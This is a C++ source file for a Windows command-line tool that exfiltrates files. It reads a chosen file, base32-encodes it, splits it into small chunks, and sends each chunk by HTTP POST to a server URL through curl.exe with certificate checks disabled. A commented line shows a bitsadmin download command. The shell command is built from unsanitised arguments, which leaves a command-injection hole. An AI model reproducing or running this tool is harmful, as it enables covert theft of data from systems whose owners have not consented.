#include <cmath>
#include <vector>
#include <csignal>
#include <cstring>
#include <fstream>
#include <iostream>
#include <sys/stat.h>
#include <cstdlib>

using namespace std;

void handle(int sig)
{
	cout << "\n[-] Exiting...\n";
	exit(0);
}

void error(string msg)
{
	cerr << "[-] Error: " << msg << endl;
	exit(1);
}

static bool startswith(const string& s, const string& prefix)
{
    return s.size() >= prefix.size() && s.compare(0, prefix.size(), prefix) == 0;
}

string read(const char *file)
{
	string text, contents = "";

	struct stat sb;
	stat(file, &sb);
	if (!S_ISREG(sb.st_mode))
		error("File can't be found.");

	ifstream f(file);
	while (getline(f, text))
	{
		contents = contents + text + '\n';
	}

	return contents;
}

string encode(string text)
{
	string base32_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
	string encoded;
	size_t i = 0;
	int bits = 0;
	int value = 0;

	for (char c : text)
	{
		value = (value << 8) | static_cast<unsigned char>(c);
		bits += 8;

		while (bits >= 5)
		{
            encoded.push_back(base32_chars[(value >> (bits - 5)) & 0x1F]);
            bits -= 5;
        }
	}

	if (bits > 0)
	{
		value <<= (5 - bits);
		encoded.push_back(base32_chars[value & 0x1F]);
	}

	// Add padding if necessary
	while (encoded.size() % 8 != 0)
	{
		encoded.push_back('=');
	}

	return encoded;
}

vector<string> split(string str, int bytes)
{
    vector<string> strings;

    if (str.length() > bytes)
    {
        for (size_t i = 0; i < str.length(); i += bytes)
        {
            strings.push_back(str.substr(i, bytes));
        }
    }
    else
    {
        strings.push_back(str);
    }

    return strings;
}

string getoutput(string cmd)
{
	FILE *pipe = popen(cmd.c_str(), "r");
	if (!pipe)
		error("Command execution failed.");

	char buf[1024];
	string res = "";
	while (!feof(pipe))
	{
		if(fgets(buf, 1024, pipe) != NULL)
			res += buf;
	}
	pclose(pipe);
	return res;
}

int main(int argc, char *argv[])
{
	signal(SIGINT, handle);
	int bytes = 50;
	string file, url = "", contents = "";

	char *name;
	(name = strrchr(argv[0], '\\')) ? ++name : (name = argv[0]);

	if (argc < 5 || argc > 7)
	{
		cout << "Usage: " << name << " -u <url> -f <file>\n";
		cout << "\nOptions:\n";
		cout << "  -u, --url\tServer url.\n";
		cout << "  -f, --file\tTarget file.\n";
		cout << "  -b, --bytes\tMax bytes per turn. (default: 50)\n";
		exit(0);
	}

	for (int i = 0; i < argc; i++)
	{
		string tmp = argv[i];
		if (!tmp.compare("-u") || !tmp.compare("--url"))
		{
			if (!argv[i+1])
				error("-u/--url expected an url or a ip atleast.");

			url = argv[i+1];

			if (!startswith(url, "http"))
				url = "https://" + url;
		}

		else if (!tmp.compare("-b") || !tmp.compare("--bytes"))
		{
			if (!argv[i+1])
				error("-b/--bytes expected an int argument.");
			
			bytes = stoi(argv[i+1]);
		}

		else if (!tmp.compare("-f") || !tmp.compare("--file"))
		{
			if (!argv[i+1])
				error("-f/--file expected a proper file.");

			file = argv[i+1];
			contents = encode(read(file.c_str()));
		}
	}

	if (contents == "" || url == "")
		error("Required both a valid url and a valid file.");

	vector<string> data = split(contents, bytes);

	cout << "[>] Starting transmission...[ENTER]";
	getchar();

	float p = 1.0;
	float size = static_cast<float>(data.size());
	for (auto &s : data)
	{
		string post_data = "file=" + file + "&data=" + s;
		string cmd = "curl.exe -sk " + url + " -X POST -d \"" + post_data + "\"";
		getoutput(cmd);
	}
}
// string command = "bitsadmin /transfer test /download /priority normal " + url + " > nul 2>&1";
